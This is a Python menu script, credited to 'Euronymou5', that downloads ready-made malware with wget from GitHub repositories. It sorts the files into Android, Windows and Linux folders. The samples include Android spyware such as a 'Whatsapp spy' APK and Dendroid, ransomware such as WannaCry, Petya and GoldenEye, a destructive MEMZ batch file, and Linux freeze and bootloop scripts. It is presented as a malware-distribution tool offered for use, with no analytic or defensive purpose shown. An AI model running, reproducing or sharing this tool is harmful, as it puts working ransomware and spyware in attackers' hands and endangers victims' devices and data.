#!/usr/bin/python
import os
import random
import time
from platform import system

class colores:
    red="\033[31;1m"
    verde="\033[92m"
    azul="\033[94m"

os.system("clear")
color_random=[colores.red,colores.verde,colores.azul]
random.shuffle(color_random)
logo = color_random[0] + '''
oooooo     oooo                                 ooo        ooooo 
 `888.     .8'                                  `88.       .888' 
  `888.   .8'    .ooooo.  ooo. .oo.    .ooooo.   888b     d'888  
   `888. .8'    d88' `88b `888P"Y88b  d88' `88b  8 Y88. .P  888  
    `888.8'     888ooo888  888   888  888   888  8  `888'   888  
     `888'      888    .o  888   888  888   888  8    Y     888  
      `8'       `Y8bod8P' o888o o888o `Y8bod8P' o8o        o888o 
      
                    Made by: Euronymou5
    '''

def android():
    print(' ')
    print('\nIngresa una opcion')
    print('[1] Whatsapp spy.apk')
    print('[2] facebook.apk')
    print('[3] Fobus.apk')
    print('[4] Opfake.apk')
    print('[5] Agent.apk')
    print('[6] MALUM.apk')
    print('[7] Mobile_Legends_Adventure.apk')
    print('[8] elite.apk')
    print('[9] vi4a.apk')
    print('[10] Grave.apk')
    print('[11] Dendroid.apk')
    print('[00] Volver al menu principal')
    print('[99] Salir')
    
    elegir2 = int(input('Selecciona una opcion :: '))
    if elegir2 == 1:
        os.system("wget https://github.com/Hacking-pch/papaviruz/raw/master/.Whatsapp-Spy.apk")
        os.system("mv '.Whatsapp-Spy.apk' Android/.Whatsapp-Spy.apk")
        android()
    elif elegir2 == 2:
        os.system("wget https://github.com/LOoLzeC/vcrt/raw/master/facebook.apk")
        os.system("mv 'facebook.apk' Android/facebook.apk")
        android()
    elif elegir2 == 3:
        os.system("wget https://github.com/LOoLzeC/vcrt/raw/master/Fobus.apk")
        os.system("mv 'Fobus.apk' Android/Fobus.apk")
        android()
    elif elegir2 == 4:
        os.system("wget https://github.com/LOoLzeC/vcrt/raw/master/Opfake.apk")
        os.system("mv 'Opfake.apk' Android/Opfake.apk")
        android()
    elif elegir2 == 5:
        os.system("wget https://github.com/LOoLzeC/vcrt/raw/master/Agent.apk")
        os.system("mv 'Agent.apk' Android/Agent.apk")
        android()
    elif elegir2 == 6:
        os.system("wget https://github.com/Gameye98/V1RU5/raw/master/Malum.apk")
        os.system("mv 'Malum.apk' Android/Malum.apk")
        android()
    elif elegir2 == 7:
        os.system("wget https://github.com/Gameye98/V1RU5/raw/master/Mobile_Legends_Adventure.apk")
        os.system("mv 'Mobile_Legends_Adventure.apk' Android/Mobile_Legends_Adventure.apk")
        android()
    elif elegir2 == 8:
        os.system("wget https://github.com/Gameye98/V1RU5/raw/master/elite.apk")
        os.system("mv 'elite.apk' Android/elite.apk")
        android()
    elif elegir2 == 9:
        os.system("wget https://github.com/Gameye98/V1RU5/raw/master/vi4a.apk")
        os.system("mv 'vi4a.apk' Android/vi4a.apk")
        android()
    elif elegir2 == 10:
        os.system("wget https://github.com/Gameye98/V1RU5/raw/master/Grave.apk")
        os.system("mv 'Grave.apk' Android/Grave.apk")
        android()
    elif elegir2 == 11:
        os.system("wget https://github.com/LOoLzeC/vcrt/raw/master/dendroid.apk")
        os.system("mv 'dendroid.apk' Android/dendroid.apk")
        android()
    elif elegir2 == 00:
          os.system("clear")
          print(logo)
          inicio()
    elif elegir2 == 99:
          exit()
    else:
        print('Error opcion invalida')
        time.sleep(3)
        os.system("clear")
        print(logo)
        android()
        
def windows():
    print(' ')
    print('\nIngresa una opcion')
    print('[1] RansomwareFileDecryptor.exe')
    print('[2] Loop windows cmd')
    print('[3] RIP.bat')
    print('[4] App.bomber.bat')
    print('[5] MEMZ-Destructive.bat')
    print('[6] Ransomware')
    print('[7] Petya Ransomware')
    print('[8] GoldenEye Petya Ransomware')
    print('[9] WannaCry Ransomware')
    print('[00] Volver al menu principal')
    print('[99] Salir')
    elegir3 = int(input('Selecciona una opcion :: '))
    if elegir3 == 1:
        os.system("wget https://github.com/LOoLzeC/vcrt/raw/master/RansomwareFileDecryptor.exe")
        os.system("mv 'RansomwareFileDecryptor.exe' Windows/RansomwareFileDecryptor.exe")
        windows()
    elif elegir3 == 2:
        os.system("wget https://github.com/Gameye98/V1RU5/raw/master/cmd.bat")
        os.system("mv 'cmd.bat' Windows/cmd.bat")
        windows()
    elif elegir3 == 3:
        os.system("wget https://github.com/Gameye98/V1RU5/raw/master/RIP.bat")
        os.system("mv 'RIP.bat' Windows/RIP.bat")
        windows()
    elif elegir3 == 4:
        os.system("wget https://github.com/rohitcoder/Virus-Store---batch-and-vbs-based-virus/raw/master/App.bomber.bat")
        os.system("mv 'App.bomber.bat' Windows/App.bomber.bat")
        windows()
    elif elegir3 == 5:
        os.system("wget https://github.com/MARSHMALLLOW/MEMZDestructiveBatch/raw/master/MEMZ-Destructive.bat")
        os.system("mv 'MEMZ-Destructive.bat' Windows/MEMZ-Destructive.bat")
        windows()
    elif elegir3 == 6:
        os.system("wget https://github.com/Ractomes/Viruses/raw/master/samples/ransomeware.exe")
        os.system("mv 'ransomeware.exe' Windows/ransomeware.exe")
        windows()
    elif elegir3 == 7:
        os.system("wget https://github.com/Mist0090/Petya/raw/main/Petya.A.exe")
        os.system("mv 'Petya.A.exe' Windows/Petya.A.exe")
        windows()
    elif elegir3 == 8:
        os.system("wget https://github.com/Mist0090/Petya/raw/main/GoldenEye.exe")
        os.system("mv 'GoldenEye.exe' Windows/GoldenEye.exe")
        windows()
    elif elegir3 == 9:
        os.system("wget https://github.com/OG476/WannaCry.exe/raw/main/WannaCry.exe")
        os.system("mv 'WannaCry.exe' Windows/WannaCry.exe")
        windows()
    elif elegir3 == 00:
        os.system("clear")
        print(logo)
        inicio()
    elif elegir3 == 99:
        exit()
    else:
        print('Error opcion invalida')
        time.sleep(2)
        os.system("clear")
        print(logo)
        windows()
    
def linux():
    print(' ')
    print('\nIngresa una opcion')
    print('[1] freeze.sh')
    print('[2] lil_virus.sh')
    print('[3] bootloop.sh')
    print('[00] Volver al menu principal')
    print('[99] Salir')
    elegir4 = int(input('Selecciona una opcion :: '))
    if elegir4 == 1:
        os.system("wget https://github.com/Gameye98/V1RU5/raw/master/freeze.sh")
        os.system("mv 'freeze.sh' Linux/freeze.sh")
        linux()
    elif elegir4 == 2:
        os.system("wget https://github.com/Gameye98/V1RU5/raw/master/lil_virus.sh")
        os.system("mv 'lil_virus.sh' Linux/lil_virus.sh")
        linux()
    elif elegir4 == 3:
        os.system("wget https://github.com/Gameye98/V1RU5/raw/master/bootloop.sh")
        os.system("mv 'bootloop.sh' Linux/bootloop.sh")
        linux()
    elif elegir4 == 00:
          os.system("clear")
          print(logo)
          inicio()
    elif elegir4 == 99:
          exit()
    else:
          print('Error opcion invalida')
          time.sleep(2)
          os.system("clear")
          print(logo)
          linux()
        
print(logo)
def inicio():
    print('\nIngresa una opcion')
    print('[1] Android')
    print('[2] Windows')
    print('[3] Linux')
    print('[99] Salir')
    elegir = int(input('Selecciona una opcion :: '))
    if elegir == 1:
        android()
    elif elegir == 2:
        windows()
    elif elegir == 3:
        linux()
    elif elegir == 99:
       exit()
    else:
       print('Error opcion invalida')
       time.sleep(2)
       os.system("clear")
       print(logo)
       inicio()

inicio()
